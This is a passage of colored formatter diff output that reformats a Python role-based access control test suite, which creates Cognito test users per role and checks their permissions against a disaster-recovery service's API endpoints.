{report['compliance_status']['compliance_score']:.1f}%\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"  AWS Security Standards: {report['compliance_status']['standards']['AWS_Security_Standards']}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"  Least Privilege Principle: {report['compliance_status']['standards']['Least_Privilege_Principle']}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        print(\u001b[0m\n\u001b[32m+            f\"  Defense in Depth: {report['compliance_status']['standards']['Defense_in_Depth']}\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         print()\n         print(\"\ud83d\udccb TOP RECOMMENDATIONS:\")\n\u001b[31m-        for i, rec in enumerate(report['recommendations'][:3], 1):\u001b[0m\n\u001b[32m+        for i, rec in enumerate(report[\"recommendations\"][:3], 1):\u001b[0m\n             print(f\"  {i}. {rec['title']} ({rec['priority']} Priority)\")\n         print()\n         print(\"\ud83d\udcc1 GENERATED REPORTS:\")\n         print(f\"  JSON Report: {json_file}\")\n         print(f\"  HTML Dashboard: {html_file}\")\n         print(f\"  CSV Matrix: {csv_file}\")\n\u001b[31m-        print(\"=\"*80)\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        print(\"=\" * 80)\u001b[0m\n\u001b[32m+\u001b[0m\n         # Determine exit code based on findings\n\u001b[31m-        critical_findings = report['executive_summary']['critical_findings']\u001b[0m\n\u001b[31m-        high_findings = report['executive_summary']['high_findings']\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        critical_findings = report[\"executive_summary\"][\"critical_findings\"]\u001b[0m\n\u001b[32m+        high_findings = report[\"executive_summary\"][\"high_findings\"]\u001b[0m\n\u001b[32m+\u001b[0m\n         if critical_findings > 0:\n\u001b[31m-            logger.error(f\"CRITICAL: Found {critical_findings} critical security issues!\")\u001b[0m\n\u001b[32m+            logger.error(\u001b[0m\n\u001b[32m+                f\"CRITICAL: Found {critical_findings} critical security issues!\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n             exit_code = 2\n         elif high_findings > 0:\n\u001b[31m-            logger.warning(f\"WARNING: Found {high_findings} high-risk security issues!\")\u001b[0m\n\u001b[32m+            logger.warning(\u001b[0m\n\u001b[32m+                f\"WARNING: Found {high_findings} high-risk security issues!\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n             exit_code = 1\n         else:\n\u001b[31m-            logger.info(\"SUCCESS: No critical or high-risk security issues found!\")\u001b[0m\n\u001b[32m+            logger.info(\u001b[0m\n\u001b[32m+                \"SUCCESS: No critical or high-risk security issues found!\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n             exit_code = 0\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         return exit_code\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     except Exception as e:\n         logger.error(f\"Security testing failed: {str(e)}\", exc_info=True)\n         return 1\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     finally:\n         # Cleanup test environment\n         if not args.no_cleanup:\n             logger.info(\"Cleaning up test environment...\")\n             try:\n                 await tester.cleanup_test_environment()\n             except Exception as e:\n                 logger.error(f\"Cleanup failed: {str(e)}\")\n \n\u001b[32m+\u001b[0m\n if __name__ == \"__main__\":\n     exit_code = asyncio.run(main())\n\u001b[31m-    sys.exit(exit_code)\u001b[0m\n\\ No newline at end of file\n\u001b[32m+    sys.exit(exit_code)\u001b[0m\n\u001b[1m--- tests/security/rbac_security_tests.py\t2025-12-31 17:23:48.163584+00:00\u001b[0m\n\u001b[1m+++ tests/security/rbac_security_tests.py\t2026-01-02 15:49:03.869506+00:00\u001b[0m\n\u001b[36m@@ -23,30 +23,34 @@\u001b[0m\n import time\n \n # Configure logging\n logging.basicConfig(\n     level=logging.INFO,\n\u001b[31m-    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'\u001b[0m\n\u001b[32m+    format=\"%(asctime)s - %(name)s - %(levelname)s - %(message)s\",\u001b[0m\n )\n logger = logging.getLogger(__name__)\n\u001b[32m+\u001b[0m\n \n class RiskLevel(Enum):\n     CRITICAL = \"CRITICAL\"\n     HIGH = \"HIGH\"\n     MEDIUM = \"MEDIUM\"\n     LOW = \"LOW\"\n     INFO = \"INFO\"\n \n\u001b[32m+\u001b[0m\n class TestStatus(Enum):\n     PASS = \"PASS\"\n     FAIL = \"FAIL\"\n     SKIP = \"SKIP\"\n     ERROR = \"ERROR\"\n \n\u001b[32m+\u001b[0m\n @dataclass\n class SecurityFinding:\n     \"\"\"Represents a security finding from testing\"\"\"\n\u001b[32m+\u001b[0m\n     test_id: str\n     title: str\n     description: str\n     risk_level: RiskLevel\n     status: TestStatus\n\u001b[36m@@ -54,58 +58,67 @@\u001b[0m\n     remediation: str\n     affected_roles: List[str]\n     timestamp: str\n     evidence: Optional[Dict[str, Any]] = None\n \n\u001b[32m+\u001b[0m\n @dataclass\n class TestUser:\n     \"\"\"Represents a test user with specific role\"\"\"\n\u001b[32m+\u001b[0m\n     username: str\n     email: str\n     role: str\n     permissions: List[str]\n     token: Optional[str] = None\n     user_id: Optional[str] = None\n \n\u001b[32m+\u001b[0m\n class RBACSecurityTester:\n     \"\"\"Main security testing orchestrator\"\"\"\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def __init__(self, config_file: str = \"tests/security/config.json\"):\n         self.config = self._load_config(config_file)\n\u001b[31m-        self.api_base_url = self.config.get('api_base_url')\u001b[0m\n\u001b[31m-        self.cognito_client = boto3.client('cognito-idp', region_name=self.config.get('aws_region'))\u001b[0m\n\u001b[31m-        self.user_pool_id = self.config.get('cognito_user_pool_id')\u001b[0m\n\u001b[31m-        self.client_id = self.config.get('cognito_client_id')\u001b[0m\n\u001b[31m-        \u001b[0m\n\u001b[32m+        self.api_base_url = self.config.get(\"api_base_url\")\u001b[0m\n\u001b[32m+        self.cognito_client = boto3.client(\u001b[0m\n\u001b[32m+            \"cognito-idp\", region_name=self.config.get(\"aws_region\")\u001b[0m\n\u001b[32m+        )\u001b[0m\n\u001b[32m+        self.user_pool_id = self.config.get(\"cognito_user_pool_id\")\u001b[0m\n\u001b[32m+        self.client_id = self.config.get(\"cognito_client_id\")\u001b[0m\n\u001b[32m+\u001b[0m\n         self.test_users: Dict[str, TestUser] = {}\n         self.findings: List[SecurityFinding] = []\n         self.test_session_id = str(uuid.uuid4())\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Load permission matrix\n         self.permission_matrix = self._load_permission_matrix()\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n     def _load_config(self, config_file: str) -> Dict[str, Any]:\n         \"\"\"Load test configuration\"\"\"\n         try:\n\u001b[31m-            with open(config_file, 'r') as f:\u001b[0m\n\u001b[32m+            with open(config_file, \"r\") as f:\u001b[0m\n                 return json.load(f)\n         except FileNotFoundError:\n\u001b[31m-            logger.warning(f\"Config file {config_file} not found, using defaults\")\u001b[0m\n\u001b[32m+            logger.warning(\u001b[0m\n\u001b[32m+                f\"Config file {config_file} not found, using defaults\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n             return {\n\u001b[31m-                'api_base_url': 'https://api.example.com',\u001b[0m\n\u001b[31m-                'aws_region': 'us-east-1',\u001b[0m\n\u001b[31m-                'cognito_user_pool_id': 'us-east-1_example',\u001b[0m\n\u001b[31m-                'cognito_client_id': 'example_client_id'\u001b[0m\n\u001b[32m+                \"api_base_url\": \"https://api.example.com\",\u001b[0m\n\u001b[32m+                \"aws_region\": \"us-east-1\",\u001b[0m\n\u001b[32m+                \"cognito_user_pool_id\": \"us-east-1_example\",\u001b[0m\n\u001b[32m+                \"cognito_client_id\": \"example_client_id\",\u001b[0m\n             }\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     def _load_permission_matrix(self) -> Dict[str, Dict[str, bool]]:\n         \"\"\"Load the permission matrix for role validation\"\"\"\n\u001b[31m-        matrix_file = Path(\"tests/security/test_scenarios/permission_matrix.json\")\u001b[0m\n\u001b[32m+        matrix_file = Path(\u001b[0m\n\u001b[32m+            \"tests/security/test_scenarios/permission_matrix.json\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         if matrix_file.exists():\n\u001b[31m-            with open(matrix_file, 'r') as f:\u001b[0m\n\u001b[32m+            with open(matrix_file, \"r\") as f:\u001b[0m\n                 return json.load(f)\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Default permission matrix\n         return {\n             \"aws:admin\": {\n                 \"register_accounts\": True,\n                 \"delete_accounts\": True,\n\u001b[36m@@ -120,11 +133,11 @@\u001b[0m\n                 \"modify_protection_groups\": True,\n                 \"view_protection_groups\": True,\n                 \"create_recovery_plans\": True,\n                 \"delete_recovery_plans\": True,\n                 \"modify_recovery_plans\": True,\n\u001b[31m-                \"view_recovery_plans\": True\u001b[0m\n\u001b[32m+                \"view_recovery_plans\": True,\u001b[0m\n             },\n             \"aws:admin-limited\": {\n                 \"register_accounts\": True,\n                 \"delete_accounts\": True,\n                 \"modify_accounts\": True,\n\u001b[36m@@ -138,11 +151,11 @@\u001b[0m\n                 \"modify_protection_groups\": True,\n                 \"view_protection_groups\": True,\n                 \"create_recovery_plans\": True,\n                 \"delete_recovery_plans\": True,\n                 \"modify_recovery_plans\": True,\n\u001b[31m-                \"view_recovery_plans\": True\u001b[0m\n\u001b[32m+                \"view_recovery_plans\": True,\u001b[0m\n             },\n             \"aws:power-user\": {\n                 \"register_accounts\": True,\n                 \"delete_accounts\": False,\n                 \"modify_accounts\": True,\n\u001b[36m@@ -156,11 +169,11 @@\u001b[0m\n                 \"modify_protection_groups\": True,\n                 \"view_protection_groups\": True,\n                 \"create_recovery_plans\": True,\n                 \"delete_recovery_plans\": True,\n                 \"modify_recovery_plans\": True,\n\u001b[31m-                \"view_recovery_plans\": True\u001b[0m\n\u001b[32m+                \"view_recovery_plans\": True,\u001b[0m\n             },\n             \"aws:operator\": {\n                 \"register_accounts\": False,\n                 \"delete_accounts\": False,\n                 \"modify_accounts\": False,\n\u001b[36m@@ -174,11 +187,11 @@\u001b[0m\n                 \"modify_protection_groups\": True,\n                 \"view_protection_groups\": True,\n                 \"create_recovery_plans\": True,\n                 \"delete_recovery_plans\": False,\n                 \"modify_recovery_plans\": True,\n\u001b[31m-                \"view_recovery_plans\": True\u001b[0m\n\u001b[32m+                \"view_recovery_plans\": True,\u001b[0m\n             },\n             \"aws:read-only\": {\n                 \"register_accounts\": False,\n                 \"delete_accounts\": False,\n                 \"modify_accounts\": False,\n\u001b[36m@@ -192,852 +205,1008 @@\u001b[0m\n                 \"modify_protection_groups\": False,\n                 \"view_protection_groups\": True,\n                 \"create_recovery_plans\": False,\n                 \"delete_recovery_plans\": False,\n                 \"modify_recovery_plans\": False,\n\u001b[31m-                \"view_recovery_plans\": True\u001b[0m\n\u001b[31m-            }\u001b[0m\n\u001b[32m+                \"view_recovery_plans\": True,\u001b[0m\n\u001b[32m+            },\u001b[0m\n         }\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def setup_test_environment(self) -> bool:\n         \"\"\"Set up the test environment with test users\"\"\"\n         logger.info(\"Setting up security test environment...\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         try:\n             # Create test users for each role\n\u001b[31m-            roles = [\"aws:admin\", \"aws:admin-limited\", \"aws:power-user\", \"aws:operator\", \"aws:read-only\"]\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+            roles = [\u001b[0m\n\u001b[32m+                \"aws:admin\",\u001b[0m\n\u001b[32m+                \"aws:admin-limited\",\u001b[0m\n\u001b[32m+                \"aws:power-user\",\u001b[0m\n\u001b[32m+                \"aws:operator\",\u001b[0m\n\u001b[32m+                \"aws:read-only\",\u001b[0m\n\u001b[32m+            ]\u001b[0m\n\u001b[32m+\u001b[0m\n             for role in roles:\n                 # Use email format for username (Cognito requirement)\n                 base_username = f\"security-test-{role.split(':')[1]}-{self.test_session_id[:8]}\"\n                 email = f\"{base_username}@example.com\"\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n                 user = TestUser(\n                     username=email,  # Use email as username for Cognito\n                     email=email,\n                     role=role,\n\u001b[31m-                    permissions=list(self.permission_matrix.get(role, {}).keys())\u001b[0m\n\u001b[31m-                )\u001b[0m\n\u001b[31m-                \u001b[0m\n\u001b[32m+                    permissions=list(\u001b[0m\n\u001b[32m+                        self.permission_matrix.get(role, {}).keys()\u001b[0m\n\u001b[32m+                    ),\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+\u001b[0m\n                 # Create user in Cognito\n                 if await self._create_test_user(user):\n                     self.test_users[role] = user\n                     logger.info(f\"Created test user for role: {role}\")\n                 else:\n\u001b[31m-                    logger.error(f\"Failed to create test user for role: {role}\")\u001b[0m\n\u001b[32m+                    logger.error(\u001b[0m\n\u001b[32m+                        f\"Failed to create test user for role: {role}\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n                     return False\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Wait for user creation to propagate\n             await asyncio.sleep(5)\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Authenticate all test users\n             for role, user in self.test_users.items():\n                 if await self._authenticate_user(user):\n                     logger.info(f\"Authenticated test user for role: {role}\")\n                 else:\n\u001b[31m-                    logger.error(f\"Failed to authenticate test user for role: {role}\")\u001b[0m\n\u001b[32m+                    logger.error(\u001b[0m\n\u001b[32m+                        f\"Failed to authenticate test user for role: {role}\"\u001b[0m\n\u001b[32m+                    )\u001b[0m\n                     return False\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             logger.info(\"Test environment setup completed successfully\")\n             return True\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n             logger.error(f\"Failed to setup test environment: {str(e)}\")\n             return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _create_test_user(self, user: TestUser) -> bool:\n         \"\"\"Create a test user in Cognito\"\"\"\n         try:\n             # Create user\n             response = self.cognito_client.admin_create_user(\n                 UserPoolId=self.user_pool_id,\n                 Username=user.username,\n                 UserAttributes=[\n\u001b[31m-                    {'Name': 'email', 'Value': user.email},\u001b[0m\n\u001b[31m-                    {'Name': 'email_verified', 'Value': 'true'}\u001b[0m\n\u001b[32m+                    {\"Name\": \"email\", \"Value\": user.email},\u001b[0m\n\u001b[32m+                    {\"Name\": \"email_verified\", \"Value\": \"true\"},\u001b[0m\n                 ],\n\u001b[31m-                TemporaryPassword='TempPass123!',\u001b[0m\n\u001b[31m-                MessageAction='SUPPRESS'\u001b[0m\n\u001b[32m+                TemporaryPassword=\"TempPass123!\",\u001b[0m\n\u001b[32m+                MessageAction=\"SUPPRESS\",\u001b[0m\n             )\n\u001b[31m-            \u001b[0m\n\u001b[31m-            user.user_id = response['User']['Username']\u001b[0m\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            user.user_id = response[\"User\"][\"Username\"]\u001b[0m\n\u001b[32m+\u001b[0m\n             # Set permanent password\n             self.cognito_client.admin_set_user_password(\n                 UserPoolId=self.user_pool_id,\n                 Username=user.username,\n\u001b[31m-                Password='SecureTestPass123!',\u001b[0m\n\u001b[31m-                Permanent=True\u001b[0m\n\u001b[32m+                Password=\"SecureTestPass123!\",\u001b[0m\n\u001b[32m+                Permanent=True,\u001b[0m\n             )\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Add user to appropriate Cognito group\n             group_name = user.role  # e.g., \"aws:admin\", \"aws:power-user\", etc.\n             try:\n                 self.cognito_client.admin_add_user_to_group(\n                     UserPoolId=self.user_pool_id,\n                     Username=user.username,\n\u001b[31m-                    GroupName=group_name\u001b[0m\n\u001b[31m-                )\u001b[0m\n\u001b[31m-                logger.info(f\"Added user {user.username} to group {group_name}\")\u001b[0m\n\u001b[32m+                    GroupName=group_name,\u001b[0m\n\u001b[32m+                )\u001b[0m\n\u001b[32m+                logger.info(\u001b[0m\n\u001b[32m+                    f\"Added user {user.username} to group {group_name}\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n             except Exception as group_error:\n\u001b[31m-                logger.warning(f\"Failed to add user to group {group_name}: {str(group_error)}\")\u001b[0m\n\u001b[32m+                logger.warning(\u001b[0m\n\u001b[32m+                    f\"Failed to add user to group {group_name}: {str(group_error)}\"\u001b[0m\n\u001b[32m+                )\u001b[0m\n                 # Continue anyway - the user was created successfully\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             return True\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n\u001b[31m-            logger.error(f\"Failed to create test user {user.username}: {str(e)}\")\u001b[0m\n\u001b[32m+            logger.error(\u001b[0m\n\u001b[32m+                f\"Failed to create test user {user.username}: {str(e)}\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n             return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _authenticate_user(self, user: TestUser) -> bool:\n         \"\"\"Authenticate a test user and get JWT token\"\"\"\n         try:\n             response = self.cognito_client.admin_initiate_auth(\n                 UserPoolId=self.user_pool_id,\n                 ClientId=self.client_id,\n\u001b[31m-                AuthFlow='ADMIN_NO_SRP_AUTH',\u001b[0m\n\u001b[32m+                AuthFlow=\"ADMIN_NO_SRP_AUTH\",\u001b[0m\n                 AuthParameters={\n\u001b[31m-                    'USERNAME': user.username,\u001b[0m\n\u001b[31m-                    'PASSWORD': 'SecureTestPass123!'\u001b[0m\n\u001b[31m-                }\u001b[0m\n\u001b[32m+                    \"USERNAME\": user.username,\u001b[0m\n\u001b[32m+                    \"PASSWORD\": \"SecureTestPass123!\",\u001b[0m\n\u001b[32m+                },\u001b[0m\n             )\n\u001b[31m-            \u001b[0m\n\u001b[31m-            user.token = response['AuthenticationResult']['IdToken']\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+            user.token = response[\"AuthenticationResult\"][\"IdToken\"]\u001b[0m\n             return True\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n         except Exception as e:\n\u001b[31m-            logger.error(f\"Failed to authenticate user {user.username}: {str(e)}\")\u001b[0m\n\u001b[32m+            logger.error(\u001b[0m\n\u001b[32m+                f\"Failed to authenticate user {user.username}: {str(e)}\"\u001b[0m\n\u001b[32m+            )\u001b[0m\n             return False\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def run_security_tests(self) -> List[SecurityFinding]:\n         \"\"\"Run all security tests\"\"\"\n         logger.info(\"Starting comprehensive security testing...\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         # Run different test categories\n         await self._run_permission_boundary_tests()\n         await self._run_privilege_escalation_tests()\n         await self._run_api_security_tests()\n         await self._run_data_access_tests()\n         await self._run_ui_security_tests()\n\u001b[31m-        \u001b[0m\n\u001b[31m-        logger.info(f\"Security testing completed. Found {len(self.findings)} findings.\")\u001b[0m\n\u001b[32m+\u001b[0m\n\u001b[32m+        logger.info(\u001b[0m\n\u001b[32m+            f\"Security testing completed. Found {len(self.findings)} findings.\"\u001b[0m\n\u001b[32m+        )\u001b[0m\n         return self.findings\n\u001b[31m-    \u001b[0m\n\u001b[32m+\u001b[0m\n     async def _run_permission_boundary_tests(self):\n         \"\"\"Test permission boundaries for all roles\"\"\"\n         logger.info(\"Running permission boundary tests...\")\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         for role, user in self.test_users.items():\n             role_permissions = self.permission_matrix.get(role, {})\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Test each permission\n             for permission, should_have_access in role_permissions.items():\n                 test_id = f\"PBT-{role}-{permission}\"\n\u001b[31m-                \u001b[0m\n\u001b[32m+\u001b[0m\n                 try:\n                     has_access = await self._test_permission(user, permission)\n\u001b[31m-                    \u001b[0m\n\u001b[32m+\u001b[0m\n                     if should_have_access and not has_access:\n                         # User should have access but doesn't - potential issue\n\u001b[31m-                        self.findings.append(SecurityFinding(\u001b[0m\n\u001b[31m-                            test_id=test_id,\u001b[0m\n\u001b[31m-                            title=f\"Permission Denied for Authorized Action\",\u001b[0m\n\u001b[31m-                            description=f\"User with role {role} was denied access to {permission} but should have access\",\u001b[0m\n\u001b[31m-                            risk_level=RiskLevel.MEDIUM,\u001b[0m\n\u001b[31m-                            status=TestStatus.FAIL,\u001b[0m\n\u001b[31m-                            details={\"role\": role, \"permission\": permission, \"expected\": True, \"actual\": False},\u001b[0m\n\u001b[31m-                            remediation=f\"Review permission configuration for role {role}\",\u001b[0m\n\u001b[31m-                            affected_roles=[role],\u001b[0m\n\u001b[31m-                            timestamp=datetime.datetime.utcnow().isoformat()\u001b[0m\n\u001b[31m-                        ))\u001b[0m\n\u001b[32m+                        self.findings.append(\u001b[0m\n\u001b[32m+                            SecurityFinding(\u001b[0m\n\u001b[32m+                                test_id=test_id,\u001b[0m\n\u001b[32m+                                title=f\"Permission Denied for Authorized Action\",\u001b[0m\n\u001b[32m+                                description=f\"User with role {role} was denied access to {permission} but should have access\",\u001b[0m\n\u001b[32m+                                risk_level=RiskLevel.MEDIUM,\u001b[0m\n\u001b[32m+                                status=TestStatus.FAIL,\u001b[0m\n\u001b[32m+                                details={\u001b[0m\n\u001b[32m+                                    \"role\": role,\u001b[0m\n\u001b[32m+                                    \"permission\": permission,\u001b[0m\n\u001b[32m+                                    \"expected\": True,\u001b[0m\n\u001b[32m+                                    \"actual\": False,\u001b[0m\n\u001b[32m+                                },\u001b[0m\n\u001b[32m+                                remediation=f\"Review permission configuration for role {role}\",\u001b[0m\n\u001b[32m+                                affected_roles=[role],\u001b[0m\n\u001b[32m+                                timestamp=datetime.datetime.utcnow().isoformat(),\u001b[0m\n\u001b[32m+                            )\u001b[0m\n\u001b[32m+                        )\u001b[0m\n                     elif not should_have_access and has_access:\n                         # User shouldn't have access but does - security issue\n\u001b[31m-                        self.findings.append(SecurityFinding(\u001b[0m\n\u001b[31m-                            test_id=test_id,\u001b[0m\n\u001b[31m-                            title=f\"Unauthorized Access Granted\",\u001b[0m\n\u001b[31m-                            description=f\"User with role {role} was granted access to {permission} but should be denied\",\u001b[0m\n\u001b[31m-                            risk_level=RiskLevel.HIGH,\u001b[0m\n\u001b[31m-                            status=TestStatus.FAIL,\u001b[0m\n\u001b[31m-                            details={\"role\": role, \"permission\": permission, \"expected\": False, \"actual\": True},\u001b[0m\n\u001b[31m-                            remediation=f\"Remove {permission} access from role {role}\",\u001b[0m\n\u001b[31m-                            affected_roles=[role],\u001b[0m\n\u001b[31m-                            timestamp=datetime.datetime.utcnow().isoformat()\u001b[0m\n\u001b[31m-                        ))\u001b[0m\n\u001b[32m+                        self.findings.append(\u001b[0m\n\u001b[32m+                            SecurityFinding(\u001b[0m\n\u001b[32m+                                test_id=test_id,\u001b[0m\n\u001b[32m+                                title=f\"Unauthorized Access Granted\",\u001b[0m\n\u001b[32m+                                description=f\"User with role {role} was granted access to {permission} but should be denied\",\u001b[0m\n\u001b[32m+                                risk_level=RiskLevel.HIGH,\u001b[0m\n\u001b[32m+                                status=TestStatus.FAIL,\u001b[0m\n\u001b[32m+                                details={\u001b[0m\n\u001b[32m+                                    \"role\": role,\u001b[0m\n\u001b[32m+                                    \"permission\": permission,\u001b[0m\n\u001b[32m+                                    \"expected\": False,\u001b[0m\n\u001b[32m+                                    \"actual\": True,\u001b[0m\n\u001b[32m+                                },\u001b[0m\n\u001b[32m+                                remediation=f\"Remove {permission} access from role {role}\",\u001b[0m\n\u001b[32m+                                affected_roles=[role],\u001b[0m\n\u001b[32m+                                timestamp=datetime.datetime.utcnow().isoformat(),\u001b[0m\n\u001b[32m+                            )\u001b[0m\n\u001b[32m+                        )\u001b[0m\n                     else:\n                         # Permission working as expected\n                         logger.debug(f\"Permission test passed: {test_id}\")\n\u001b[31m-                        \u001b[0m\n\u001b[32m+\u001b[0m\n                 except Exception as e:\n\u001b[31m-                    self.findings.append(SecurityFinding(\u001b[0m\n\u001b[31m-                        test_id=test_id,\u001b[0m\n\u001b[31m-                        title=f\"Permission Test Error\",\u001b[0m\n\u001b[31m-                        description=f\"Error testing permission {permission} for role {role}: {str(e)}\",\u001b[0m\n\u001b[31m-                        risk_level=RiskLevel.MEDIUM,\u001b[0m\n\u001b[31m-                        status=TestStatus.ERROR,\u001b[0m\n\u001b[31m-                        details={\"role\": role, \"permission\": permission, \"error\": str(e)},\u001b[0m\n\u001b[31m-                        remediation=\"Investigate permission testing infrastructure\",\u001b[0m\n\u001b[31m-                        affected_roles=[role],\u001b[0m\n\u001b[31m-                        timestamp=datetime.datetime.utcnow().isoformat()\u001b[0m\n\u001b[31m-                    ))\u001b[0m\n\u001b[31m-    \u001b[0m\n\u001b[32m+                    self.findings.append(\u001b[0m\n\u001b[32m+                        SecurityFinding(\u001b[0m\n\u001b[32m+                            test_id=test_id,\u001b[0m\n\u001b[32m+                            title=f\"Permission Test Error\",\u001b[0m\n\u001b[32m+                            description=f\"Error testing permission {permission} for role {role}: {str(e)}\",\u001b[0m\n\u001b[32m+                            risk_level=RiskLevel.MEDIUM,\u001b[0m\n\u001b[32m+                            status=TestStatus.ERROR,\u001b[0m\n\u001b[32m+                            details={\u001b[0m\n\u001b[32m+                                \"role\": role,\u001b[0m\n\u001b[32m+                                \"permission\": permission,\u001b[0m\n\u001b[32m+                                \"error\": str(e),\u001b[0m\n\u001b[32m+                            },\u001b[0m\n\u001b[32m+                            remediation=\"Investigate permission testing infrastructure\",\u001b[0m\n\u001b[32m+                            affected_roles=[role],\u001b[0m\n\u001b[32m+                            timestamp=datetime.datetime.utcnow().isoformat(),\u001b[0m\n\u001b[32m+                        )\u001b[0m\n\u001b[32m+                    )\u001b[0m\n\u001b[32m+\u001b[0m\n     async def _test_permission(self, user: TestUser, permission: str) -> bool:\n         \"\"\"Test a specific permission for a user\"\"\"\n         # Map permissions to actual DRS business API endpoints\n         permission_endpoints = {\n             \"register_accounts\": (\"POST\", \"/accounts/targets\"),\n             \"delete_accounts\": (\"DELETE\", \"/accounts/targets/123456789012\"),\n             \"modify_accounts\": (\"PUT\", \"/accounts/targets/123456789012\"),\n             \"view_accounts\": (\"GET\", \"/accounts/targets\"),\n             \"start_recovery\": (\"POST\", \"/executions\"),\n             \"stop_recovery\": (\"POST\", \"/executions/test-execution/cancel\"),\n\u001b[31m-            \"terminate_instances\": (\"POST\", \"/executions/test-execution/terminate-instances\"),\u001b[0m\n\u001b[32m+            \"terminate_instances\": (\u001b[0m\n\u001b[32m+                \"POST\",\u001b[0m\n\u001b[32m+                \"/executions/test-execution/terminate-instances\",\u001b[0m\n\u001b[32m+            ),\u001b[0m\n             \"view_executions\": (\"GET\", \"/executions\"),\n             \"create_protection_groups\": (\"POST\", \"/protection-groups\"),\n\u001b[31m-            \"delete_protection_groups\": (\"DELETE\", \"/protection-groups/test-group\"),\u001b[0m\n\u001b[31m-            \"modify_protection_groups\": (\"PUT\", \"/protection-groups/test-group\"),\u001b[0m\n\u001b[32m+            \"delete_protection_groups\": (\u001b[0m\n\u001b[32m+                \"DELETE\",\u001b[0m\n\u001b[32m+                \"/protection-groups/test-group\",\u001b[0m\n\u001b[32m+            ),\u001b[0m\n\u001b[32m+            \"modify_protection_groups\": (\u001b[0m\n\u001b[32m+                \"PUT\",\u001b[0m\n\u001b[32m+                \"/protection-groups/test-group\",\u001b[0m\n\u001b[32m+            ),\u001b[0m\n             \"view_protection_groups\": (\"GET\", \"/protection-groups\"),\n             \"create_recovery_plans\": (\"POST\", \"/recovery-plans\"),\n             \"delete_recovery_plans\": (\"DELETE\", \"/recovery-plans/test-plan\"),\n             \"modify_recovery_plans\": (\"PUT\", \"/recovery-plans/test-plan\"),\n\u001b[31m-            \"view_recovery_plans\": (\"GET\", \"/recovery-plans\")\u001b[0m\n\u001b[32m+            \"view_recovery_plans\": (\"GET\", \"/recovery-plans\"),\u001b[0m\n         }\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         if permission not in permission_endpoints:\n             logger.warning(f\"Unknown permission: {permission}\")\n             return False\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         method, endpoint = permission_endpoints[permission]\n\u001b[31m-        \u001b[0m\n\u001b[32m+\u001b[0m\n         try:\n             headers = {\n\u001b[31m-                'Authorization': f'Bearer {user.token}',\u001b[0m\n\u001b[31m-                'Content-Type': 'application/json'\u001b[0m\n\u001b[32m+                \"Authorization\": f\"Bearer {user.token}\",\u001b[0m\n\u001b[32m+                \"Content-Type\": \"application/json\",\u001b[0m\n             }\n\u001b[31m-            \u001b[0m\n\u001b[32m+\u001b[0m\n             # Prepare test data for POST/PUT requests\n             test_data = {}\n\u001b[31m-            if method in ['POST', 'PUT']:\u001b[0m\n\u001b[31m-                if 'accounts' in endpoint:\u001b[0m\n\u001b[32m+            if method in [\"POST\", \"PUT\"]:\u001b[0m\n\u001b[32m+                if \"accounts\" in endpoint:\u001b[0m\n                     test_data = {\n\u001b[31m-                        'accountId': '123456789012',\u001b[0m\n\u001b[31m-                        'accountName': 'Test Account',\u001b[0m\n\u001b[31m-                        'status': 'active'\u001b[0m\n\u001b[32m+                        \"accountId\": \"123456789012\",\u001b[0m\n\u001b[32m+                        \"accountName\": \"Test Account\",\u001b[0m\n\u001b[32m+                        \"status\": \"active\",\u001b[0m\n                     }\n\u001b[31m-                elif 'protection-groups' in endpoint:\u001b[0m\n\u001b[32m+                elif \"protection-groups\" in 